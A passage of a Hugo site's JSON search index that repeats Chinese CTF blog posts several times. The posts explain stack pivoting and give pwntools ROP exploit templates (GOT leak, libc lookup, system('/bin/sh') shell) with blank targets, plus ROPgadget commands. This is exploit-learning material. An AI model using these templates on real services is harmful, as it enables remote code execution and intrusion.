very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"অনুসন্ধানের ফলাফল"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"অনুসন্ধানের ফলাফল"},{"categories":null,"contents":"栈迁移原理 0x1利用前提 1.存在栈溢出\n2.栈溢出可利用空间过小，无法写入较长的ROP链\n0x2主要利用点 leave; ret; #其中leave -\u0026gt;\u0026gt; mov esp,ebp; #\tpop ebp; #其中ret -\u0026gt;\u0026gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：\n其中leave_ret为代码leave;ret;地址。\n而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令\n当我们挨个去执行的时候会出现这样的情况\n首先是 mov esp,ebp 执行完以后变成了这个样子：\n然后 pop ebp 执行完后就是\n别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位\n这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处\n构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址\n其中\n为read的参数\nread 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样\n首先是 mov esp,ebp 执行完成后效果如下：\n然后是 pop ebp 执行完成后：\nesp依旧下移一个单位\n此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数\n0x4总结 栈迁移主要体现在对ebp和esp的控制(通过leave；ret；实现)在bss或data段来开辟一个可执行空间（伪造的栈），\n并在此执行ROP。\n","date":"July 18, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/en/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/","summary":"栈迁移原理 0x1利用前提 1.存在栈溢出\n2.栈溢出可利用空间过小，无法写入较长的ROP链\n0x2主要利用点 leave; ret; #其中leave -\u0026gt;\u0026gt; mov esp,ebp; #\tpop ebp; #其中ret -\u0026gt;\u0026gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：\n其中leave_ret为代码leave;ret;地址。\n而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令\n当我们挨个去执行的时候会出现这样的情况\n首先是 mov esp,ebp 执行完以后变成了这个样子：\n然后 pop ebp 执行完后就是\n别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位\n这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处\n构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址\n其中\n为read的参数\nread 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样\n首先是 mov esp,ebp 执行完成后效果如下：","tags":null,"title":"栈迁移原理"},{"categories":null,"contents":"栈迁移原理 0x1利用前提 1.存在栈溢出\n2.栈溢出可利用空间过小，无法写入较长的ROP链\n0x2主要利用点 leave; ret; #其中leave -\u0026gt;\u0026gt; mov esp,ebp; #\tpop ebp; #其中ret -\u0026gt;\u0026gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：\n其中leave_ret为代码leave;ret;地址。\n而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令\n当我们挨个去执行的时候会出现这样的情况\n首先是 mov esp,ebp 执行完以后变成了这个样子：\n然后 pop ebp 执行完后就是\n别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位\n这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处\n构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址\n其中\n为read的参数\nread 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样\n首先是 mov esp,ebp 执行完成后效果如下：\n然后是 pop ebp 执行完成后：\nesp依旧下移一个单位\n此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数\n0x4总结 栈迁移主要体现在对ebp和esp的控制(通过leave；ret；实现)在bss或data段来开辟一个可执行空间（伪造的栈），\n并在此执行ROP。\n","date":"July 18, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/","summary":"栈迁移原理 0x1利用前提 1.存在栈溢出\n2.栈溢出可利用空间过小，无法写入较长的ROP链\n0x2主要利用点 leave; ret; #其中leave -\u0026gt;\u0026gt; mov esp,ebp; #\tpop ebp; #其中ret -\u0026gt;\u0026gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：\n其中leave_ret为代码leave;ret;地址。\n而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令\n当我们挨个去执行的时候会出现这样的情况\n首先是 mov esp,ebp 执行完以后变成了这个样子：\n然后 pop ebp 执行完后就是\n别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位\n这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处\n构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址\n其中\n为read的参数\nread 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样\n首先是 mov esp,ebp 执行完成后效果如下：","tags":null,"title":"栈迁移原理"},{"categories":null,"contents":"栈迁移原理 0x1利用前提 1.存在栈溢出\n2.栈溢出可利用空间过小，无法写入较长的ROP链\n0x2主要利用点 leave; ret; #其中leave -\u0026gt;\u0026gt; mov esp,ebp; #\tpop ebp; #其中ret -\u0026gt;\u0026gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：\n其中leave_ret为代码leave;ret;地址。\n而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令\n当我们挨个去执行的时候会出现这样的情况\n首先是 mov esp,ebp 执行完以后变成了这个样子：\n然后 pop ebp 执行完后就是\n别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位\n这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处\n构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址\n其中\n为read的参数\nread 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样\n首先是 mov esp,ebp 执行完成后效果如下：\n然后是 pop ebp 执行完成后：\nesp依旧下移一个单位\n此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数\n0x4总结 栈迁移主要体现在对ebp和esp的控制(通过leave；ret；实现)在bss或data段来开辟一个可执行空间（伪造的栈），\n并在此执行ROP。\n","date":"July 18, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/zh-tw/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/","summary":"栈迁移原理 0x1利用前提 1.存在栈溢出\n2.栈溢出可利用空间过小，无法写入较长的ROP链\n0x2主要利用点 leave; ret; #其中leave -\u0026gt;\u0026gt; mov esp,ebp; #\tpop ebp; #其中ret -\u0026gt;\u0026gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：\n其中leave_ret为代码leave;ret;地址。\n而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令\n当我们挨个去执行的时候会出现这样的情况\n首先是 mov esp,ebp 执行完以后变成了这个样子：\n然后 pop ebp 执行完后就是\n别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位\n这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处\n构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址\n其中\n为read的参数\nread 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样\n首先是 mov esp,ebp 执行完成后效果如下：","tags":null,"title":"栈迁移原理"},{"categories":null,"contents":"64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.dump(\u0026#34;system\u0026#34;) bin_sh_addr = offset + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #*************************** #************get shell************ payload1 = b\u0026#39;a\u0026#39;*(0x40+8) + p64(pop_rdi) + p64(bin_sh_addr) payload1+= p64(sys_addr) payload1 = payload1.ljust(200,\u0026#39;b\u0026#39;) p.sendline(payload1) p.interactive() ROPgadget ROPgadget \u0026ndash;binary rop \u0026ndash;only \u0026lsquo;pop|ret\u0026rsquo; | grep \u0026lsquo;eax\u0026rsquo; 查找可存储寄存器的代码\nROPgadget \u0026ndash;binary rop \u0026ndash;string \u0026ldquo;/bin/sh\u0026rdquo; 查找字符串\nROPgadget \u0026ndash;binary rop \u0026ndash;only \u0026lsquo;int\u0026rsquo; 查找有int 0x80的地址\n64位传参 对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。\n","date":"July 12, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/en/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/","summary":"64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.","tags":null,"title":"64位栈溢出rop模板(无PIE)"},{"categories":null,"contents":"64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.dump(\u0026#34;system\u0026#34;) bin_sh_addr = offset + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #*************************** #************get shell************ payload1 = b\u0026#39;a\u0026#39;*(0x40+8) + p64(pop_rdi) + p64(bin_sh_addr) payload1+= p64(sys_addr) payload1 = payload1.ljust(200,\u0026#39;b\u0026#39;) p.sendline(payload1) p.interactive() ROPgadget ROPgadget \u0026ndash;binary rop \u0026ndash;only \u0026lsquo;pop|ret\u0026rsquo; | grep \u0026lsquo;eax\u0026rsquo; 查找可存储寄存器的代码\nROPgadget \u0026ndash;binary rop \u0026ndash;string \u0026ldquo;/bin/sh\u0026rdquo; 查找字符串\nROPgadget \u0026ndash;binary rop \u0026ndash;only \u0026lsquo;int\u0026rsquo; 查找有int 0x80的地址\n64位传参 对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。\n","date":"July 12, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/","summary":"64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.","tags":null,"title":"64位栈溢出rop模板(无PIE)"},{"categories":null,"contents":"64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.dump(\u0026#34;system\u0026#34;) bin_sh_addr = offset + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #*************************** #************get shell************ payload1 = b\u0026#39;a\u0026#39;*(0x40+8) + p64(pop_rdi) + p64(bin_sh_addr) payload1+= p64(sys_addr) payload1 = payload1.ljust(200,\u0026#39;b\u0026#39;) p.sendline(payload1) p.interactive() ROPgadget ROPgadget \u0026ndash;binary rop \u0026ndash;only \u0026lsquo;pop|ret\u0026rsquo; | grep \u0026lsquo;eax\u0026rsquo; 查找可存储寄存器的代码\nROPgadget \u0026ndash;binary rop \u0026ndash;string \u0026ldquo;/bin/sh\u0026rdquo; 查找字符串\nROPgadget \u0026ndash;binary rop \u0026ndash;only \u0026lsquo;int\u0026rsquo; 查找有int 0x80的地址\n64位传参 对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。\n","date":"July 12, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/zh-tw/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/","summary":"64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.","tags":null,"title":"64位栈溢出rop模板(无PIE)"},{"categories":null,"contents":"32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;./\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;./\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) + payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.dump(\u0026#39;write\u0026#39;) system_addr = libc_base + libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) log.info(\u0026#34;system_addr =\u0026gt; %#x\u0026#34;, system_addr) log.info(\u0026#34;binsh_addr =\u0026gt; %#x\u0026#34;, binsh_addr) #********************* #*********************调用system（“/bin/sh”） select = 1 if select == 1: #方案1 payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr) else: #方案2 read_plt = elf.plt[\u0026#39;read\u0026#39;] pop3_ret = 0x0804856c bss_addr = elf.bss() payload = 